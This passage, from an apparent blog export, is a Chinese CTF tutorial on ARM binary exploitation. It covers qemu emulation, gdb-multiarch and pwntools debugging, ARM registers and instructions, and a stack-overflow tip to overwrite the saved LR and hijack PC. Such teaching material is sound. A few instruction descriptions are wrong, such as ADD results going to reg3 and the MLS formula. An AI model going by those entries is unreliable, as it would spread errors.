在面对静态链接的程序，IDA打开之后会发现里面有几百个函数，而且也搜不到main函数，在这种情况下，可以利用搜**索关键字符串，通过关键字符串去找主函数**。\n\n\n\n","source":"_posts/ArmPwn.md","raw":"---\ntitle: ArmPwn\ndate: 2023-01-07 10:53:26\ncategories: \n- pwn\ntags: \n- pwn\n- arm\n\n---\n\nArm架构下的pwn与x86类似，只是用的是RISC的处理器架构，指令集会与x86有较大的差别。Arm广泛地使用在许多嵌入式系统设计。由于节能的特点，ARM处理器非常适用于移动通讯领域，符合其主要设计目标为低耗电的特性。因此我们常用的手机、平板等移动设备都是采用ARM体系架构的，因此CTF中不可避免也会出现ARM架构的pwn题，但是相比x86会简单许多，通常都是普通的栈溢出。\n<!-- more -->\n\n## 环境搭建\n\n本地的机器大多都是`x86`架构的，无法运行`ARM`架构的程序，需要我们通过`qemu`来运行。\n\n### 32位\n\n采用命令`qemu-arm prog_name`运行。\n\n```sh\nqemu-arm -L /usr/arm-linux-gnueabi/ ./prog # 不是hf的\nqemu-arm -L /usr/arm-linux-gnueabihf/ ./prog # hf的\n```\n\n### 64位\n\n采用命令`qemu-aarch64 ./prog`运行。\n\n但对于**动态链接**的程序还是无法正常运行，此时需要安装对应架构的动态链接库才行：（`arm64`和`aarch64`是同一个架构的不同名称）\n\n```sh\nsudo apt search \"libc6\" | grep arm\nsudo apt install libc6-dbg-arm64-cross # 或其他的库\n```\n\n安装完成后在`/usr`目录下会出现`aarch64-linux-gnu`这个文件夹，该文件夹即对应刚安装好的arm64位libc库，之后我们使用下面的命令指定arm程序的动态链接器，即可运行程序，32位类似。\n\n通过`-L `指定libc`qemu-aarch64 -L /usr/aarch64-linux-gnu/ ./prog`\n\n`armel`和`armhf`，这主要是针对浮点计算来区分的，其中`armel (arm eabi little endian)`使用fpu浮点运算单元，但传参还是用**普通寄存器**；`armhf (arm hard float)`也使用fpu浮点运算单元，同时使用fpu中的**浮点寄存器**传参。\n\n`arm64`默认用的是`armhf`，所以也就没有这个后缀，因此**有这个后缀区分的都是指的是32位arm架构**。\n\n### 大端序的arm\n\n采用命令`qemu-armeb`运行。\n\n### 调试\n\n在`qemu`启动程序时通过`-g`指定端口：\n\n```sh\n# qemu-arch -g port -L /usr/arch-lib-dir/ ./prog\nqemu-arm -g 8888 ./typo\n```\n\n利用`gdb-multiarch`连上端口进行调试：\n\n```sh\n$ gdb-multiarch\n......\n......\npwndbg> set architecture arm\nThe target architecture is assumed to be arm\npwndbg> target remote localhost:8888\n```\n\n在`pwntools`中调试的话需要修改下代码：\n\n```py\n p = process([\"qemu-arm\", \"-g\", \"8888\", \"./typo\"])\n```\n\n如果32位遇见这个报错的话：`/lib/ld-linux-armhf.so.3: No such file or directory`\n\n输入命令`sudo apt-get install libc6-armhf-cross`\n\n如果遇见这个报错的话：`Invalid ELF image for this architecture`\n\n说明用的`qemu`架构不对\n\n## 基础知识\n\n### 寄存器\n\n```\n32位：\nR0, R1, R2, R3, R4, R5, R6, R7, R8, R9, R10, R11, R12, R13, R14, R15...\n64位：\nX0, X1, X2, X3, X4, X5, X6, X7, X8, X9, X10, X11, X12, X13, X14, X15...\n```\n\n#### 32位\n\n![arm](./ArmPwn/arm32register)\n\n- `R0~R3`主要用于子程序之间的**参数传递**，剩下的参数**从右向左**依次入栈， 被调用者实现栈平衡，函数的**返回值保存在 `R0`** 中\n- `R4~R11`主要用于**保存局部变量**，但在 Thumb 程序中，通常只能使用`R4~R7`来保存局部变量\n- `R12`用作子程序间scratch 寄存器，即 ip 寄存器\n- `R13`为`SP`，即栈指针。在物理上实际上有两个栈指针：主栈指针(MSP)和进程栈指针(PSP)，一般的进程只有一个栈指针可见。这个也好理解，就好比在x86-64系统中，内核的栈指针和用户进程的栈指针不同一样。\n- `R14`为链接寄存器`LR`，用于保存函数或子程序调用时**返回地址**。在x86-64系统中，函数调用的返回值是保存在子函数栈帧的上面，即`rbp+8`的位置，在ARM系统中，函数调用同样需要将返回地址保存到栈中，因为`LR`在函数返回时会进行自动更新，如果栈中没有返回地址，那么`LR`就不知道要更新成什么值了。\n- `PC`为程序计数器。`PC`的最低有效位（LSB）是一个控制结构，为1时表示进入Thumb状态。当有些时候程序跳转更新PC时需要将新PC值的LSB置1，否则会触发错误异常。这也可以看做是一种程序恶意跳转的保护机制。有时还会将`PC`作为基址访问数据。\n\n除了这些寄存器之外，还有一些特殊寄存器，他们未经过存储器映射,可以使用MSR和MRS等特殊寄存器访问指令来进行访问。\n\n 程序状态寄存器包括以下三个状态寄存器：\n\n- 应用PSR（APSR）\n- 执行PSR（EPSR）\n- 中断PSR（IPSR）\n\n中断/异常屏蔽寄存器：\n\n- PRIMASK\n- FAULTMASK\n- BASEPRI\n- 只有特权状态才可以操作三个寄存器（非特权状态下的写操作会被忽略，读操作返回0）。三个寄存器默认值为0，即屏蔽（禁止异常/中断）不起作用。\n\nCONTROL寄存器\n\n另外，在x86-64架构和ARM架构中都有很多的**浮点数**寄存器，用于进行浮点数计算。在ARM架构中，浮点数寄存器有32个32位寄存器`S0~S31`，其中可以两两组合访问为`D0~D15`，如`S0`和`S1`组合为`D0`。\n\n#### 64位\n\nARMv8有31个通用寄存器`X0-X30`, 还有`SP`、`PC`、`XZR`等寄存器\n\n- `X0-X7` 用于**参数传递**\n- `X9-X15` 在子函数中使用这些寄存器时，直接使用即可, 无需save/restore. 在汇编代码中x9-x15出现的频率极低\n- `X19-X29` 在callee子函数中使用这些寄存器时，需要**先save**这些寄存器，在退出子函数时再resotre\n- `X8, X16-X18, X29, X30` 这些都是特殊用途的寄存器\n    - `X8`： 用于**返回结果**\n    - `X16`、`X17 `：进程内临时寄存器\n    - `X18` ：resrved for ABI\n    - `X29` ：`FP`（frame pointer register）\n    - `X30` ：`LR`，用于保存函数或子程序调用时**返回地址**。\n\n### 指令集\n\n**指令、伪指令**\n\n（汇编）指令： 是机器码的**助记符**，经过汇编器编译后，由CPU执行。\n\n（汇编）伪指令：用来**指导**指令执行，是汇编器的产物，**最终不会生成机器码**。\n\n**有两种不同风格的ARM指令**\n\n1. ARM官方的ARM汇编风格：指令一般用大写。\n\n2. GNU风格的ARM汇编：指令一般用小写。\n\nARM的指令集和x86-64有一些相似之处，但也有一些不同，需要注意的是，**ARM的立即数前面需要加上#标识**，如#0x12345678。下面的指令均为32位系统下的指令。\n\n#### 寄存器与寄存器（立即数）之间的数据传送（`MOV`系列指令）\n\n```asm\nMOV/MOVS reg1, <reg2/imm8>：赋值reg1为reg2/imm8\nMOVW <reg32>, <imm16>：赋值reg32的低16位为imm16\nMOVT <reg32>, <imm16>：赋值reg32的高16位为imm16\nMVN reg1, <reg2>：将reg2的值取反之后赋值给reg1\nLDR <reg32>, =<imm32>：赋值reg32为imm32\n```\n\n#### 存储器传送数据（`LDR`和`STR`系列指令）\n\nARM使用单独的指令集进行寄存器和内存空间的数据交换，其中基址可以选择任意一个通用寄存器或PC寄存器，变址也可以使用任意一个通用寄存器，较x86更加灵活：\n\n`LDR`：加载某一地址的内容到寄存器\n\n`STR`：存储寄存器的内容到某一地址\n\n```asm\nLDRB/LDRH/LDR reg1, [<reg2/PC>, <imm32>]<!>：赋值8/16/32位reg2+imm32地址的数据到reg1，如果指令后面有叹号，表示指令执行后reg2值更新为reg2+imm32，有叹号可等同于 LDRB/LDRH/LDR reg1, [<reg2>], <imm32>，这种形式称为后序指令。\nLDRD reg1, <reg2>, [<reg3/PC>, <imm32>]<!>：赋值64位reg3+imm32地址的数据到reg1和reg2，有叹号可等同于 LDRD reg1, <reg2>, [reg3], <imm32>\nLDRSB/LDRSH reg1, [<reg2/PC>, <imm32>]<!>：有符号传送8/16位reg2+imm32地址的数据到reg1，目标寄存器会进行32位有符号扩展，有叹号可等同于 LDRSB/LDRSH reg1, [<reg2>], <imm32>\nSTRB/STRH/STR reg1, [<reg2>, <imm32>]<!>：保存寄存器reg1的8/16/32位值到reg2+imm32地址，有叹号可等同于 STRB/STRH/STR reg1, [<reg2>], <imm32>\nSTRD reg1, <reg2>, [reg3, <imm32>]<!>：保存寄存器reg1和reg2的64位值值到reg3+imm32地址，有叹号可等同于 STRD reg1, <reg2>, [reg3], <imm32>\nLDRB/LDRH/LDR reg1, [<reg2/PC>, reg3{, LSL <imm>}]：赋值寄存器reg1的值为reg2/PC+(reg3{<<imm})地址处的8/16/32位值\nLDRD reg1, <reg2>, [<reg3/PC>, <reg4-32>{, LSL <imm>}]：赋值寄存器reg1和reg2的值为reg3/PC+(reg4-32{<<imm})地址处的64位值\nSTRB/STRH/STR reg1, [<reg2>, reg3{, LSL <imm>}]：保存寄存器reg1的8/16/32位值到reg2+(reg3{<<imm})地址\nLDMIA/LDMDB reg1<!>, <reg-list>：将reg1地址的值按照顺序保存到reg-list中的寄存器中，如果reg1后有叹号，则在保存值后自动增加（LDMIA）或减少（LDMDB）reg1。如LDMIA R0, {R1-R5}，LDMIA R0, {R1, R3, R6-R9}\nSTMIA/STMDB reg1<!>, <reg-list>：向reg1地址存入寄存器组中的多个字。如果reg1后有叹号，则在保存值后自动增加（STMIA）或减少（STMDB）reg1。\n```\n\n注意：后序指令不能使用PC寻址。\n\n#### 入栈出栈\n\n虽然ARM与x86都使用push和pop指令进行入栈和出栈，但ARM可以实现一条指令多次出入栈。\n\n```asm\nPUSH <reg-list>：将寄存器组中的寄存器值依次入栈，reg-list中可以有PC、LR寄存器。\nPOP <reg-list>：将出栈的值依次存入寄存器组中的寄存器，reg-list中可以有PC、LR寄存器。\n```\n\n\n\n#### 算术运算\n\n不同于x86指令的大多数算术运算使用两个寄存器，ARM指令的算数运算指令**通常包含3个寄存器**，实现运算后的自由赋值而不是x86中必须赋值给目标寄存器且目标寄存器必须参与运算。\n\n第一个操作数用于**保存运算结果**，第二个操作数作**被**加/减/乘/除数，第三个操作数作加/减/乘/除数。\n\n`ADD/C`加/进位加、`SUB/SBC`减/借位减、`MUL`乘、`U/SDIV`无/有符号除法...\n\n```asm\nADD/SUB reg1, <reg2>, <reg3/imm32>：计算<reg2>(+/-)<reg3/imm32>将结果保存到reg3\nADC/SBC reg1, <reg2>, reg3：计算<reg2>(+/-)reg3+(进位/借位)将结果保存到reg3\nADC <reg32>, <imm32>：计算reg32+imm32+进位将结果保存到reg32\nSBC reg1, <reg2>, <imm32>：计算<reg2>-imm32-借位将结果保存到reg1\nRSB reg1, <reg2>, <reg3/imm32>：计算<reg3/imm>-<reg2>将结果保存到reg1\nMUL reg1, <reg2>, reg3：计算<reg2>*reg3将结果保存到reg1\nUDIV/SDIV reg1, <reg2>, reg3：计算<reg2>/reg3（无符号/有符号）将结果保存到reg1，如果除以0，则结果为0\nMLA reg1, <reg2>, reg3, <reg4-32>：计算reg1=<reg2>*reg3+<reg4-32>\nMLS reg1, <reg2>, reg3, <reg4-32>：计算reg1=-<reg2>*reg3-<reg4-32>\n```\n\n#### 移位运算\n\n`ASR`算术右移（补充符号位）、`LSL`逻辑左移、`LSR`逻辑右移、`ROR`循环右移。\n\n如果有两个操作数：第一个操作数用于**保存运算结果**，也是**被移位的数**，第二个操作数是**移动的位数**\n\n如果有三个操作数：第一个操作数用于**保存运算结果**，第二个操作数是**被移位的数**，第三个操作数是**移动的位数**\n\n```asm\nASR/LSL/LSR reg1, <reg2>{, <reg3/imm32>}：如果reg3/imm存在，则表示reg1=<reg2>(>>/<<)<reg3/imm32>，否则表示reg1=reg1(>>/<<)<reg2>（算数右移、逻辑左移、逻辑右移）\nROR reg1, <reg2>{, reg3}：如果reg3存在，则表示reg1=<reg2>(>>)reg3，否则表示reg1=reg1(>>)<reg2>（循环右移）\n```\n\n#### 数据取反\n\n将寄存器中的值按字节进行取反。\n\n```asm\nREV reg1, reg2：将reg2中的4字节数据按字节反转后赋值给reg1（reg2值不变），原先第0，1，2，3字节的内容被换到了第3，2，1，0字节。\nREV16 reg1, reg2：将reg2中的4字节以字单位分为高字和低字分别进行反转后赋值给reg1（reg2值不变），原先第0，1，2，3字节的内容被换到了第1，0，3，2字节。\nREVSH reg1, reg2：将reg2中的低2字节反转后有符号扩展赋值给reg1\nREVH reg1, reg2：REV指令的16位表示，只反转低2字节。\n```\n\n#### 位域操作\n位域操作允许机器指令对寄存器中的特定位进行处理，在x86中好像是也有这样的指令，只是使用频率太低。\n\n```asm\nBFD reg1, #lsb, #width：将reg1中从第lsb位开始的连续width位清零。\nBFI reg1, reg2, #lsb, #width：将reg2中最低width位复制到reg1中从lsb位开始的连续width位。\nCLZ reg1, reg2：计算reg2中高位0的个数并赋值给reg1，多用于浮点数计算。\nRBIT reg1, reg2：反转reg2寄存器中的所有位并赋值给reg1。\nSBFX/UBFX reg1, reg2, #lsb, #width：取reg2中从第lsb位开始的连续width位并有/无符号扩展，赋值给reg1。\n```\n\n#### 比较和测试指令\n与x86使用cmp指令和test指令相似，ARM也有关于比较和测试的指令，且实现原理基本相同。\n\n```asm\nCMP reg1, reg2/imm：比较两个寄存器或寄存器与立即数，更新标志位APSR。\nCMN reg1, reg2/imm：比较reg1和-reg2或-imm，更新标志位APSR。\nTST reg1, reg2/imm：参照x86的test指令，相与测试，更新N（负数位）和Z（零）标志\nTEQ reg1, reg2/imm：异或测试，更新N和Z标志\n```\n\n#### 跳转指令\n\n`B`系列的位跳转指令，`BL`相当于`call`。\n\n```asm\nB/B.W <label>：无条件跳转到指定位置，B.W跳转范围更大。\nBX reg：寄存器跳转。\nBL <label> / BLX reg：跳转到指定位置/寄存器值，且将返回地址保存到LR寄存器中，类比x86的call指令。一般在函数开头都会首先将BL寄存器的值保存到栈中便于返回时获取。\n条件跳转指令族：类比x86指令：\nBEQ == je\nBNE == jne\nBCS/BHS == jc（进位标志为1，可表示无符号大于等于）\nBCC/BLO == jnc（进位标志为0，可表示无符号小于）\nBMI == js（负数标志为1）\nBPL == jns（负数标志为0）\nBVS == jo（溢出标志为1）\nBVC == jno（溢出标志为0）\nBHI == ja（无符号大于）\nBLS == jbe（无符号小于等于）\nBGE == jge（有符号大于等于）\nBLE == jle（有符号小于等于）\nBGT == jg（有符号大于）\nBLT == jl（有符号小于）\nCBZ/CBNZ reg, <label>：比较寄存器的值为0/不为0时跳转（只支持前向跳转）\n```\n\n## 解题技巧\n\n1. arm pwn程序在IDA反汇编后通常都是一大堆sub函数，有许多常用的函数都没有符号，这时**不要硬逆**。arm程序逻辑较为简单，可通过**运行**大致猜测是什么函数。**（三分逆，七分猜**\n1. 栈溢出时覆盖`LR`在栈上的位置，并通过劫持`PC`不断控制执行流。\n1. 在面对静态链接的程序，IDA打开之后会发现里面有几百个函数，而且也搜不到main函数，在这种情况下，可以利用搜**索关键字符串，通过关键字符串去找主函数**。\n\n\n\n","slug":"ArmPwn","published":1,"updated":"2023-03-23T09:34:20.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clg9czaew00075oud5gqeahje","content":"<p>Arm架构下的pwn与x86类似，只是用的是RISC的处理器架构，指令集会与x86有较大的差别。Arm广泛地使用在许多嵌入式系统设计。由于节能的特点，ARM处理器非常适用于移动通讯领域，符合其主要设计目标为低耗电的特性。因此我们常用的手机、平板等移动设备都是采用ARM体系架构的，因此CTF中不可避免也会出现ARM架构的pwn题，但是相比x86会简单许多，通常都是普通的栈溢出。</p>\n<span id=\"more\"></span>\n\n<h2 id=\"环境搭建\"><a href=\"#环境搭建\" class=\"headerlink\" title=\"环境搭建\"></a>环境搭建</h2><p>本地的机器大多都是<code>x86</code>架构的，无法运行<code>ARM</code>架构的程序，需要我们通过<code>qemu</code>来运行。</p>\n<h3 id=\"32位\"><a href=\"#32位\" class=\"headerlink\" title=\"32位\"></a>32位</h3><p>采用命令<code>qemu-arm prog_name</code>运行。</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">qemu-arm -L /usr/arm-linux-gnueabi/ ./prog <span class=\"comment\"># 不是hf的</span></span><br><span class=\"line\">qemu-arm -L /usr/arm-linux-gnueabihf/ ./prog <span class=\"comment\"># hf的</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"64位\"><a href=\"#64位\" class=\"headerlink\" title=\"64位\"></a>64位</h3><p>采用命令<code>qemu-aarch64 ./prog</code>运行。</p>\n<p>但对于<strong>动态链接</strong>的程序还是无法正常运行，此时需要安装对应架构的动态链接库才行：（<code>arm64</code>和<code>aarch64</code>是同一个架构的不同名称）</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo apt search <span class=\"string\">&quot;libc6&quot;</span> | grep arm</span><br><span class=\"line\">sudo apt install libc6-dbg-arm64-cross <span class=\"comment\"># 或其他的库</span></span><br></pre></td></tr></table></figure>\n\n<p>安装完成后在<code>/usr</code>目录下会出现<code>aarch64-linux-gnu</code>这个文件夹，该文件夹即对应刚安装好的arm64位libc库，之后我们使用下面的命令指定arm程序的动态链接器，即可运行程序，32位类似。</p>\n<p>通过<code>-L </code>指定libc<code>qemu-aarch64 -L /usr/aarch64-linux-gnu/ ./prog</code></p>\n<p><code>armel</code>和<code>armhf</code>，这主要是针对浮点计算来区分的，其中<code>armel (arm eabi little endian)</code>使用fpu浮点运算单元，但传参还是用<strong>普通寄存器</strong>；<code>armhf (arm hard float)</code>也使用fpu浮点运算单元，同时使用fpu中的<strong>浮点寄存器</strong>传参。</p>\n<p><code>arm64</code>默认用的是<code>armhf</code>，所以也就没有这个后缀，因此<strong>有这个后缀区分的都是指的是32位arm架构</strong>。</p>\n<h3 id=\"大端序的arm\"><a href=\"#大端序的arm\" class=\"headerlink\" title=\"大端序的arm\"></a>大端序的arm</h3><p>采用命令<code>qemu-armeb</code>运行。</p>\n<h3 id=\"调试\"><a href=\"#调试\" class=\"headerlink\" title=\"调试\"></a>调试</h3><p>在<code>qemu</code>启动程序时通过<code>-g</code>指定端口：</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># qemu-arch -g port -L /usr/arch-lib-dir/ ./prog</span></span><br><span class=\"line\">qemu-arm -g 8888 ./typo</span><br></pre></td></tr></table></figure>\n\n<p>利用<code>gdb-multiarch</code>连上端口进行调试：</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ gdb-multiarch</span><br><span class=\"line\">......</span><br><span class=\"line\">......</span><br><span class=\"line\">pwndbg&gt; <span class=\"built_in\">set</span> architecture arm</span><br><span class=\"line\">The target architecture is assumed to be arm</span><br><span class=\"line\">pwndbg&gt; target remote localhost:8888</span><br></pre></td></tr></table></figure>\n\n<p>在<code>pwntools</code>中调试的话需要修改下代码：</p>\n<figure class=\"highlight py\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">p = process([<span class=\"string\">&quot;qemu-arm&quot;</span>, <span class=\"string\">&quot;-g&quot;</span>, <span class=\"string\">&quot;8888&quot;</span>, <span class=\"string\">&quot;./typo&quot;</span>])</span><br></pre></td></tr></table></figure>\n\n<p>如果32位遇见这个报错的话：<code>/lib/ld-linux-armhf.so.3: No such file or directory</code></p>\n<p>输入命令<code>sudo apt-get install libc6-armhf-cross</code></p>\n<p>如果遇见这个报错的话：<code>Invalid ELF image for this architecture</code></p>\n<p>说明用的<code>qemu</code>架构不对</p>\n<h2 id=\"基础知识\"><a href=\"#基础知识\" class=\"headerlink\" title=\"基础知识\"></a>基础知识</h2><h3 id=\"寄存器\"><a href=\"#寄存器\" class=\"headerlink\" title=\"寄存器\"></a>寄存器</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">32位：</span><br><span class=\"line\">R0, R1, R2, R3, R4, R5, R6, R7, R8, R9, R10, R11, R12, R13, R14, R15...</span><br><span class=\"line\">64位：</span><br><span class=\"line\">X0, X1, X2, X3, X4, X5, X6, X7, X8, X9, X10, X11, X12, X13, X14, X15...</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"32位-1\"><a href=\"#32位-1\" class=\"headerlink\" title=\"32位\"></a>32位</h4><p><img src=\"./ArmPwn/arm32register\" alt=\"arm\"></p>\n<ul>\n<li><code>R0~R3</code>主要用于子程序之间的<strong>参数传递</strong>，剩下的参数<strong>从右向左</strong>依次入栈， 被调用者实现栈平衡，函数的<strong>返回值保存在 <code>R0</code></strong> 中</li>\n<li><code>R4~R11</code>主要用于<strong>保存局部变量</strong>，但在 Thumb 程序中，通常只能使用<code>R4~R7</code>来保存局部变量</li>\n<li><code>R12</code>用作子程序间scratch 寄存器，即 ip 寄存器</li>\n<li><code>R13</code>为<code>SP</code>，即栈指针。在物理上实际上有两个栈指针：主栈指针(MSP)和进程栈指针(PSP)，一般的进程只有一个栈指针可见。这个也好理解，就好比在x86-64系统中，内核的栈指针和用户进程的栈指针不同一样。</li>\n<li><code>R14</code>为链接寄存器<code>LR</code>，用于保存函数或子程序调用时<strong>返回地址</strong>。在x86-64系统中，函数调用的返回值是保存在子函数栈帧的上面，即<code>rbp+8</code>的位置，在ARM系统中，函数调用同样需要将返回地址保存到栈中，因为<code>LR</code>在函数返回时会进行自动更新，如果栈中没有返回地址，那么<code>LR</code>就不知道要更新成什么值了。</li>\n<li><code>PC</code>为程序计数器。<code>PC</code>的最低有效位（LSB）是一个控制结构，为1时表示进入Thumb状态。当有些时候程序跳转更新PC时需要将新PC值的LSB置1，否则会触发错误异常。这也可以看做是一种程序恶意跳转的保护机制。有时还会将<code>PC</code>作为基址访问数据。</li>\n</ul>\n<p>除了这些寄存器之外，还有一些特殊寄存器，他们未经过存储器映射,可以使用MSR和MRS等特殊寄存器访问指令来进行访问。</p>\n<p> 程序状态寄存器包括以下三个状态寄存器：</p>\n<ul>\n<li>应用PSR（APSR）</li>\n<li>执行PSR（EPSR）</li>\n<li>中断PSR（IPSR）</li>\n</ul>\n<p>中断/异常屏蔽寄存器：</p>\n<ul>\n<li>PRIMASK</li>\n<li>FAULTMASK</li>\n<li>BASEPRI</li>\n<li>只有特权状态才可以操作三个寄存器（非特权状态下的写操作会被忽略，读操作返回0）。三个寄存器默认值为0，即屏蔽（禁止异常/中断）不起作用。</li>\n</ul>\n<p>CONTROL寄存器</p>\n<p>另外，在x86-64架构和ARM架构中都有很多的<strong>浮点数</strong>寄存器，用于进行浮点数计算。在ARM架构中，浮点数寄存器有32个32位寄存器<code>S0~S31</code>，其中可以两两组合访问为<code>D0~D15</code>，如<code>S0</code>和<code>S1</code>组合为<code>D0</code>。</p>\n<h4 id=\"64位-1\"><a href=\"#64位-1\" class=\"headerlink\" title=\"64位\"></a>64位</h4><p>ARMv8有31个通用寄存器<code>X0-X30</code>, 还有<code>SP</code>、<code>PC</code>、<code>XZR</code>等寄存器</p>\n<ul>\n<li><code>X0-X7</code> 用于<strong>参数传递</strong></li>\n<li><code>X9-X15</code> 在子函数中使用这些寄存器时，直接使用即可, 无需save/restore. 在汇编代码中x9-x15出现的频率极低</li>\n<li><code>X19-X29</code> 在callee子函数中使用这些寄存器时，需要<strong>先save</strong>这些寄存器，在退出子函数时再resotre</li>\n<li><code>X8, X16-X18, X29, X30</code> 这些都是特殊用途的寄存器<ul>\n<li><code>X8</code>： 用于<strong>返回结果</strong></li>\n<li><code>X16</code>、<code>X17 </code>：进程内临时寄存器</li>\n<li><code>X18</code> ：resrved for ABI</li>\n<li><code>X29</code> ：<code>FP</code>（frame pointer register）</li>\n<li><code>X30</code> ：<code>LR</code>，用于保存函数或子程序调用时<strong>返回地址</strong>。</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"指令集\"><a href=\"#指令集\" class=\"headerlink\" title=\"指令集\"></a>指令集</h3><p><strong>指令、伪指令</strong></p>\n<p>（汇编）指令： 是机器码的<strong>助记符</strong>，经过汇编器编译后，由CPU执行。</p>\n<p>（汇编）伪指令：用来<strong>指导</strong>指令执行，是汇编器的产物，<strong>最终不会生成机器码</strong>。</p>\n<p><strong>有两种不同风格的ARM指令</strong></p>\n<ol>\n<li><p>ARM官方的ARM汇编风格：指令一般用大写。</p>\n</li>\n<li><p>GNU风格的ARM汇编：指令一般用小写。</p>\n</li>\n</ol>\n<p>ARM的指令集和x86-64有一些相似之处，但也有一些不同，需要注意的是，<strong>ARM的立即数前面需要加上#标识</strong>，如#0x12345678。下面的指令均为32位系统下的指令。</p>\n<h4 id=\"寄存器与寄存器（立即数）之间的数据传送（MOV系列指令）\"><a href=\"#寄存器与寄存器（立即数）之间的数据传送（MOV系列指令）\" class=\"headerlink\" title=\"寄存器与寄存器（立即数）之间的数据传送（MOV系列指令）\"></a>寄存器与寄存器（立即数）之间的数据传送（<code>MOV</code>系列指令）</h4><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">MOV/MOVS reg1, &lt;reg2/imm8&gt;：赋值reg1为reg2/imm8</span><br><span class=\"line\">MOVW &lt;reg32&gt;, &lt;imm16&gt;：赋值reg32的低16位为imm16</span><br><span class=\"line\">MOVT &lt;reg32&gt;, &lt;imm16&gt;：赋值reg32的高16位为imm16</span><br><span class=\"line\">MVN reg1, &lt;reg2&gt;：将reg2的值取反之后赋值给reg1</span><br><span class=\"line\">LDR &lt;reg32&gt;, =&lt;imm32&gt;：赋值reg32为imm32</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"存储器传送数据（LDR和STR系列指令）\"><a href=\"#存储器传送数据（LDR和STR系列指令）\" class=\"headerlink\" title=\"存储器传送数据（LDR和STR系列指令）\"></a>存储器传送数据（<code>LDR</code>和<code>STR</code>系列指令）</h4><p>ARM使用单独的指令集进行寄存器和内存空间的数据交换，其中基址可以选择任意一个通用寄存器或PC寄存器，变址也可以使用任意一个通用寄存器，较x86更加灵活：</p>\n<p><code>LDR</code>：加载某一地址的内容到寄存器</p>\n<p><code>STR</code>：存储寄存器的内容到某一地址</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">LDRB/LDRH/LDR reg1, [&lt;reg2/PC&gt;, &lt;imm32&gt;]&lt;!&gt;：赋值8/16/32位reg2+imm32地址的数据到reg1，如果指令后面有叹号，表示指令执行后reg2值更新为reg2+imm32，有叹号可等同于 LDRB/LDRH/LDR reg1, [&lt;reg2&gt;], &lt;imm32&gt;，这种形式称为后序指令。</span><br><span class=\"line\">LDRD reg1, &lt;reg2&gt;, [&lt;reg3/PC&gt;, &lt;imm32&gt;]&lt;!&gt;：赋值64位reg3+imm32地址的数据到reg1和reg2，有叹号可等同于 LDRD reg1, &lt;reg2&gt;, [reg3], &lt;imm32&gt;</span><br><span class=\"line\">LDRSB/LDRSH reg1, [&lt;reg2/PC&gt;, &lt;imm32&gt;]&lt;!&gt;：有符号传送8/16位reg2+imm32地址的数据到reg1，目标寄存器会进行32位有符号扩展，有叹号可等同于 LDRSB/LDRSH reg1, [&lt;reg2&gt;], &lt;imm32&gt;</span><br><span class=\"line\">STRB/STRH/STR reg1, [&lt;reg2&gt;, &lt;imm32&gt;]&lt;!&gt;：保存寄存器reg1的8/16/32位值到reg2+imm32地址，有叹号可等同于 STRB/STRH/STR reg1, [&lt;reg2&gt;], &lt;imm32&gt;</span><br><span class=\"line\">STRD reg1, &lt;reg2&gt;, [reg3, &lt;imm32&gt;]&lt;!&gt;：保存寄存器reg1和reg2的64位值值到reg3+imm32地址，有叹号可等同于 STRD reg1, &lt;reg2&gt;, [reg3], &lt;imm32&gt;</span><br><span class=\"line\">LDRB/LDRH/LDR reg1, [&lt;reg2/PC&gt;, reg3&#123;, LSL &lt;imm&gt;&#125;]：赋值寄存器reg1的值为reg2/PC+(reg3&#123;&lt;&lt;imm&#125;)地址处的8/16/32位值</span><br><span class=\"line\">LDRD reg1, &lt;reg2&gt;, [&lt;reg3/PC&gt;, &lt;reg4-32&gt;&#123;, LSL &lt;imm&gt;&#125;]：赋值寄存器reg1和reg2的值为reg3/PC+(reg4-32&#123;&lt;&lt;imm&#125;)地址处的64位值</span><br><span class=\"line\">STRB/STRH/STR reg1, [&lt;reg2&gt;, reg3&#123;, LSL &lt;imm&gt;&#125;]：保存寄存器reg1的8/16/32位值到reg2+(reg3&#123;&lt;&lt;imm&#125;)地址</span><br><span class=\"line\">LDMIA/LDMDB reg1&lt;!&gt;, &lt;reg-list&gt;：将reg1地址的值按照顺序保存到reg-list中的寄存器中，如果reg1后有叹号，则在保存值后自动增加（LDMIA）或减少（LDMDB）reg1。如LDMIA R0, &#123;R1-R5&#125;，LDMIA R0, &#123;R1, R3, R6-R9&#125;</span><br><span class=\"line\">STMIA/STMDB reg1&lt;!&gt;, 